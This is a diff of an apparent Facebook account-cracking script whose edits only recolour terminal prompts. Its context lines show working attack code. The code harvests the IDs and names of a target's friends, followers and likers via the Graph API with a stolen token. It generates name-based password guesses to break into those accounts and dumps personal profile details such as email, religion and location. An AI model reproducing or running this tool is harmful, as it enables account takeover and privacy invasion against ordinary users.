@@ -402,7 +402,7 @@ def publik():
         exit()
     try:
         print('%s╠══[%s•%s] %s\x1b[0;93mINPUT ID'%(O,P,O,P))
-        it = input("%s╠══[%s•%s] %s\x1b[0;92mID Target : "%(O,P,O,P))
+        it = input("%s╠══[%s•%s] %s\x1b[0;93mID Target : "%(O,P,O,P))
         try:
             pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
             ob = json.loads(pb.text)
@@ -434,7 +434,7 @@ def pengikut():
     except (KeyError,IOError):
         jid = '5000'
     except requests.exceptions.ConnectionError:
-        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        jalan('%s╚══[%s!%s] %s\x1b[0;91mConnection Problem'%(M,P,M,P))
         exit()
     try:
         token = open("token.txt","r").read()
@@ -442,22 +442,22 @@ def pengikut():
         y = json.loads(x.text)
         n = y['name']
     except (KeyError,IOError):
-        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        jalan('%s╚══[%s!%s] %s\x1b[0;91mToken/Cookies Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
         menu_log()
     except requests.exceptions.ConnectionError:
-        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        jalan('%s╚══[%s!%s] %s\x1b[0;91mConnection Problem'%(M,P,M,P))
         exit()
     try:
-        print('%s╠══[%s•%s] %sInput ID '%(O,P,O,P))
-        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
+        print('%s╠══[%s•%s] %s\x1b[0;93mInput ID '%(O,P,O,P))
+        it = input("%s╠══[%s•%s] %s\x1b[0;93mID Target : \x1b[0;92m"%(O,P,O,P))
         try:
             pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
             ob = json.loads(pb.text)
-            print ('%s╠══[%s•%s] %sName : %s'%(O,P,O,P,ob['name']))
+            print ('%s╠══[%s•%s] %s\x1b[0;93mName : \x1b[0;92m%s'%(O,P,O,P,ob['name']))
         except (KeyError,IOError):
             print('%s║'%(O))
-            jalan('%s╚══[%s!%s] %sID Not Found'%(M,P,M,P))
+            jalan('%s╚══[%s!%s] %s\x1b[0;91mID Not Found'%(M,P,M,P))
             menu()
         r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
         id = []
@@ -468,10 +468,10 @@ def pengikut():
             id.append(a["id"]+"•"+a["name"])
             xb.write(a["id"]+"•"+a["name"]+"\n")
         xb.close()
-        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
+        print('%s╠══[%s•%s] %s\x1b[0;93mTotal ID : \x1b[0;92m%s'%(O,P,O,P,len(id)))
         return crack(xc)
     except Exception as e:
-        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))
+        exit('%s╚══[%s!%s] %s\x1b[0;93mError : \x1b[0;92m %s'%(M,P,M,P,e))
 def likers():
     try:
         lisensi = open("license.txt","r").read()
@@ -482,7 +482,7 @@ def likers():
     except (KeyError,IOError):
         jid = '5000'
     except requests.exceptions.ConnectionError:
-        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        jalan('%s╚══[%s!%s] %s\x1b[0;91mConnection Problem'%(M,P,M,P))
         exit()
     try:
         token = open("token.txt","r").read()
@@ -490,22 +490,22 @@ def likers():
         y = json.loads(x.text)
         n = y['name']
     except (KeyError,IOError):
-        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        jalan('%s╚══[%s!%s] %s\x1b[0;91mToken/Cookies Invalid'%(M,P,M,P))
         os.system('rm -rf token.txt')
         menu_log()
     except requests.exceptions.ConnectionError:
-        jalan('%s╚══[%s!%s] %sConnection Problem'%(M,P,M,P))
+        jalan('%s╚══[%s!%s] %s\x1b[0;91mConnection Problem'%(M,P,M,P))
         exit()
     try:
-        print('%s╠══[%s•%s] %sINPUT ID'%(O,P,O,P))
-        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
+        print('%s╠══[%s•%s] %s\x1b[0;93mINPUT ID'%(O,P,O,P))
+        it = input("%s╠══[%s•%s] %s\x1b[0;93mID Target : \x1b[0;92m"%(O,P,O,P))
         try:
             pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
             ob = json.loads(pb.text)
-            print ('%s╠══[%s•%s] %sName : %s'%(O,P,O,P,ob['name']))
+            print ('%s╠══[%s•%s] %s\x1b[0;93mName : \x1b[0;92m%s'%(O,P,O,P,ob['name']))
         except (KeyError,IOError):
             print('%s║'%(O))
-            jalan('%s╚══[%s!%s] %sID Not Found'%(M,P,M,P))
+            jalan('%s╚══[%s!%s] %s\x1b[0;91mID Not Found'%(M,P,M,P))
             menu()
         r = requests.get("https://graph.facebook.com/%s/likes?limit=%s&access_token=%s"%(it,jid,token))
         id = []
@@ -516,10 +516,10 @@ def likers():
             id.append(a["id"]+"•"+a["name"])
             xb.write(a["id"]+"•"+a["name"]+"\n")
         xb.close()
-        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
+        print('%s╠══[%s•%s] %s\x1b[0;93mTotal ID : \x1b[0;92m%s'%(O,P,O,P,len(id)))
         return crack(xc)
     except Exception as e:
-        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))
+        exit('%s╚══[%s!%s] %s\x1b[0;93mError :\x1b[0;92m %s'%(M,P,M,P,e))
 def generate1(_cici_):
     _dapunta_=[]
     for i in _cici_.split(" "):
@@ -616,14 +616,14 @@ def generate4(_cici_):
     return _dapunta_
 def tambah_pass():
     print('%s║'%(O))
-    print('%s╠══[%s•%s] %sFor Example :  jeeck,123456,786786'%(O,P,O,P))
-    cuy = input('%s╠══[%s•%s] %sMasukkan Pass Tambahan Manual [1 Kata] : '%(O,P,O,P))
+    print('%s╠══[%s•%s] %s\x1b[0;93mFor Example :  \x1b[0;92mjeeck,123456,786786'%(O,P,O,P))
+    cuy = input('%s╠══[%s•%s] %s\x1b[0;93mMasukkan Pass Tambahan Manual [1 Kata] :\x1b[0;92m '%(O,P,O,P))
     gh = open('pass.txt','w')
     gh.write(cuy)
     gh.close
 def tambah_pass_angka():
-    print('%s╠══[%s•%s] %sFor Example : 321,786,1122,123'%(O,P,O,P))
-    coy = input('%s╠══[%s•%s] %sEnter Additional Pass Behind Name : '%(O,P,O,P))
+    print('%s╠══[%s•%s] %s\x1b[0;93mFor Example : \x1b[0;92m321,786,1122,123'%(O,P,O,P))
+    coy = input('%s╠══[%s•%s] %s\x1b[0;93mEnter Additional Pass Behind Name : \x1b[0;92m'%(O,P,O,P))
     xy = open('passangka.txt','w')
     xy.write(coy)
     xy.close
@@ -843,11 +843,11 @@ class crack:
         self.cp = []
         self.ko = 0
         print('%s║'%(O))
-        print('%s╠══[%s•%s] %sCrack With Password Default/Manual [d/m]'%(O,P,O,P))
+        print('%s╠══[%s•%s] %s\x1b[0;93mCrack With Password Default/Manual [d/m]'%(O,P,O,P))
         while True:
-            f = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+            f = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
             if f=="":
-                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                 menu()
             elif f in ['m','M','2','02','002']:
                 try:
@@ -867,7 +867,7 @@ class crack:
                 except Exception as e:
                     print(("   %s"%e))
                     continue
-                print('%s╠══[%s•%s] %sFor example : sayang,786786,1234567123456'%(O,P,O,P))
+                print('%s╠══[%s•%s] %s\x1b[0;93mFor example : \x1b[0;92msayang,786786,1234567123456'%(O,P,O,P))
                 self.pwlist()
                 break
             elif f in ['d','D','1','01','001']:
@@ -882,9 +882,9 @@ class crack:
                             continue
                     self.fl = []
                     start_methodezz()
-                    kopi = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                    kopi = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
                     if kopi in ['']:
-                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                        jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                         menu()
                     elif kopi in ['1','01']:
                         for i in self.fs:
@@ -911,19 +911,19 @@ class crack:
                                 self.fl.append({"id":i.split("•")[0],"pw":generate4(i.split("•")[1])})
                             except:continue
                     else:
-                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                        jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                         menu()
                     start_method()
-                    put = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                    put = input('%s╠══[%s•%s] %s\x1b[0;93mChoose :\x1b[0;92m '%(O,P,O,P))
                     print('%s║'%(O))
                     if put in ['']:
-                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                        jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                         menu()
                     elif put in ['1','01','001','a']:
-                        print('%s╠══[%s•%s] %sBring Up  CP Option? [y/t]'%(O,P,O,P))
-                        puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                        print('%s╠══[%s•%s] %s\x1b[0;93mBring Up  CP Option? [y/t]'%(O,P,O,P))
+                        puf = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
                         if puf in ['']:
-                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                             menu()
                         elif puf in ['1','01','001','y','Y']:
                             started()
@@ -938,13 +938,13 @@ class crack:
                             exit()
                             break
                         else:
-                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                             menu()
                     elif put in ['2','02','002','b']:
-                        print('%s╠══[%s•%s] %sBring Up  CP Option? [y/t]'%(O,P,O,P))
-                        puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                        print('%s╠══[%s•%s] %s\x1b[0;93mBring Up  CP Option? [y/t]'%(O,P,O,P))
+                        puf = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
                         if puf in ['']:
-                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                             menu()
                         elif puf in ['1','01','001','y','Y']:
                             started()
@@ -959,13 +959,13 @@ class crack:
                             exit()
                             break
                         else:
-                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                             menu()
                     elif put in ['3','03','003','c']:
-                        print('%s╠══[%s•%s] %sBring up CP Option? [y/t]'%(O,P,O,P))
-                        puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                        print('%s╠══[%s•%s] %s\x1b[0;93mBring up CP Option? [y/t]'%(O,P,O,P))
+                        puf = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
                         if puf in ['']:
-                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                             menu()
                         elif puf in ['1','01','001','y','Y']:
                             started()
@@ -980,31 +980,31 @@ class crack:
                             exit()
                             break
                         else:
-                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                            jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                             menu()
                     else:
-                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                        jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                         menu()
                 except Exception as e:
                     print(("   %s"%e))
     def pwlist(self):
-        self.pw = input('%s╠══[%s•%s] %sEnter Password : '%(O,P,O,P)).split(",")
+        self.pw = input('%s╠══[%s•%s] %s\x1b[0;93mEnter Password : \x1b[0;92m'%(O,P,O,P)).split(",")
         if len(self.pw) ==0:
             self.pwlist()
         else:
             for i in self.fl:
                 i.update({"pw":self.pw})
             start_method()
-            put = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+            put = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
             print('%s║'%(O))
             if put in ['']:
-                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                 menu()
             elif put in ['1','01','001','a']:
-                print('%s╠══[%s•%s] %sBring up  CP Option? [y/t]'%(O,P,O,P))
-                puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                print('%s╠══[%s•%s] %s\x1b[0;93mBring up  CP Option? [y/t]'%(O,P,O,P))
+                puf = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
                 if puf in ['']:
-                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                     menu()
                 elif puf in ['1','01','001','y','Y']:
                     started()
@@ -1017,13 +1017,13 @@ class crack:
                     os.remove(self.apk)
                     exit()
                 else:
-                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                     menu()
             elif put in ['2','02','002','b']:
-                print('%s╠══[%s•%s] %sBring up CP option? [y/t]'%(O,P,O,P))
-                puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                print('%s╠══[%s•%s] %s\x1b[0;93mBring up CP option? [y/t]'%(O,P,O,P))
+                puf = input('%s╠══[%s•%s] %s\x1b[0;93mChoose : \x1b[0;92m'%(O,P,O,P))
                 if puf in ['']:
-                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                     menu()
                 elif puf in ['1','01','001','y','Y']:
                     started()
@@ -1036,13 +1036,13 @@ class crack:
                     os.remove(self.apk)
                     exit()
                 else:
-                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                     menu()
             elif put in ['3','03','003','c']:
-                print('%s╠══[%s•%s] %sBring up CP option? [y/t]'%(O,P,O,P))
-                puf = input('%s╠══[%s•%s] %sChoose : '%(O,P,O,P))
+                print('%s╠══[%s•%s] %s\x1b[0;93mBring up CP option? [y/t]'%(O,P,O,P))
+                puf = input('%s╠══[%s•%s] %s\x1b[0;92mChoose : \x1b[0;91m'%(O,P,O,P))
                 if puf in ['']:
-                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                     menu()
                 elif puf in ['1','01','001','y','Y']:
                     started()
@@ -1055,10 +1055,10 @@ class crack:
                     os.remove(self.apk)
                     exit()
                 else:
-                    jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                    jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                     menu()
             else:
-                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
+                jalan('%s╚══[%s!%s] %s\x1b[0;91mIsi Yang Benar'%(M,P,M,P))
                 menu()
     def api(self,fl):
         try:
@@ -1294,7 +1294,7 @@ class crack:
 def target():
     try:token = open('token.txt','r').read()
     except (KeyError,IOError):jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P));menu_log()
-    idt = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
+    idt = input("%s╠══[%s•%s] %s\x1b[0;93mID Target : \x1b[0;92m"%(O,P,O,P))
     try:
         zx = requests.get("https://graph.facebook.com/"+idt+"?access_token="+token);zy = json.loads(zx.text)
     except (KeyError,IOError):jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P));menu()
@@ -1330,38 +1330,38 @@ def target():
     except (KeyError,IOError):ab = ("-")
     try:lo = zy["locale"]
     except (KeyError,IOError):lo = ("-")
-    jalan('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,nm))
-    jalan('%s╠══[%s•%s] %sNama Depan : %s'%(O,P,O,P,nd))
-    jalan('%s╠══[%s•%s] %sNama Tengah : %s'%(O,P,O,P,nt))
-    jalan('%s╠══[%s•%s] %sNama Belakang : %s'%(O,P,O,P,nb))
-    jalan('%s╠══[%s•%s] %sTTL : %s'%(O,P,O,P,ut))
-    jalan('%s╠══[%s•%s] %sGender : %s'%(O,P,O,P,gd))
-    jalan('%s╠══[%s•%s] %sEmail : %s'%(O,P,O,P,em))
-    jalan('%s╠══[%s•%s] %sLink : %s'%(O,P,O,P,lk))
-    jalan('%s╠══[%s•%s] %sUsername : %s'%(O,P,O,P,us))
-    jalan('%s╠══[%s•%s] %sAgama : %s'%(O,P,O,P,rg))
-    jalan('%s╠══[%s•%s] %sStatus Hubungan : %s'%(O,P,O,P,rl))
-    jalan('%s╠══[%s•%s] %sHubungan Dengan : %s'%(O,P,O,P,rls))
-    jalan('%s╠══[%s•%s] %sTempat Tinggal : %s'%(O,P,O,P,lc))
-    jalan('%s╠══[%s•%s] %sTempat Asal : %s'%(O,P,O,P,ht))
-    jalan('%s╠══[%s•%s] %sTentang : %s'%(O,P,O,P,ab))
-    jalan('%s╠══[%s•%s] %sLocale : %s'%(O,P,O,P,lo))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mNama : \x1b[0;92m%s'%(O,P,O,P,nm))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mNama Depan :\x1b[0;92m %s'%(O,P,O,P,nd))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mNama Tengah : \x1b[0;92m%s'%(O,P,O,P,nt))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mNama Belakang : \x1b[0;92m %s'%(O,P,O,P,nb))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mTTL : \x1b[0;92m%s'%(O,P,O,P,ut))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mGender : \x1b[0;92m%s'%(O,P,O,P,gd))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mEmail : \x1b[0;92m%s'%(O,P,O,P,em))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mLink : \x1b[0;92m%s'%(O,P,O,P,lk))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mUsername : \x1b[0;92m%s'%(O,P,O,P,us))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mAgama : \x1b[0;92m%s'%(O,P,O,P,rg))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mStatus Hubungan : \x1b[0;92m%s'%(O,P,O,P,rl))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mHubungan Dengan : \x1b[0;92m%s'%(O,P,O,P,rls))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mTempat Tinggal : \x1b[0;92m%s'%(O,P,O,P,lc))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mTempat Asal : \x1b[0;92m%s'%(O,P,O,P,ht))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mTentang : \x1b[0;92m%s'%(O,P,O,P,ab))
+    jalan('%s╠══[%s•%s] %s\x1b[0;93mLocale : \x1b[0;92m%s'%(O,P,O,P,lo))
     print('%s║'%(O))
-    input('%s╚══[ %sReturn %s]%s'%(O,P,O,P))
+    input('%s╚══[ %s\x1b[0;93mReturn %s]%s'%(O,P,O,P))
     menu()
 def teman_target():
-    it = input('%s╠══[%s•%s] %sID Target : '%(O,P,O,P))
+    it = input('%s╠══[%s•%s] %s\x1b[0;93mID Target : \x1b[0;92m'%(O,P,O,P))
     try:
         token = open('token.txt','r').read()
         mm = requests.get('https://graph.facebook.com/%s?access_token=%s'%(it,token))
         nn = json.loads(mm.text)
-        print ('%s╠══[%s•%s] %sName : %s'%(O,P,O,P,nn['name']))
+        print ('%s╠══[%s•%s] %s\x1b[0;93mName : \x1b[0;92m%s'%(O,P,O,P,nn['name']))
     except (KeyError,IOError):
-        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
+        jalan('%s╚══[%s!%s] %s\x1b[0;91mToken/Cookies Invalid'%(M,P,M,P))
         menu_log()
     tt=[]
     te=[]
-    lim = input('%s╠══[%s•%s] %sLimit Dump : '%(O,P,O,P))
+    lim = input('%s╠══[%s•%s] %s\x1b[0;93mLimit Dump : '%(O,P,O,P))
     print('%s║%s'%(O,P))
     ada = requests.get('https://graph.facebook.com/%s/friends?limit=%s&access_token=%s'%(it,lim,token))
     idi = json.loads(ada.text)
@@ -1375,13 +1375,13 @@ def teman_target():
                 for b in idi2['data']:
                     te.append(b['id'])
             except KeyError:
-                print('╠══[!] Private')
+                print('╠══[!] \x1b[0;91mPrivate')
             print('╠══[•]',id,'•',len(te))
             te.clear()
         except KeyError:
-            print('╠══[!] Spam Accounts')
+            print('╠══[!] \x1b[0;91mSpam Accounts')
     print('║')
-    input('╚══[ Return ]')
+    input('╚══[ \x1b[0;93mReturn ]')
     menu()
 def hasil():
     clear()
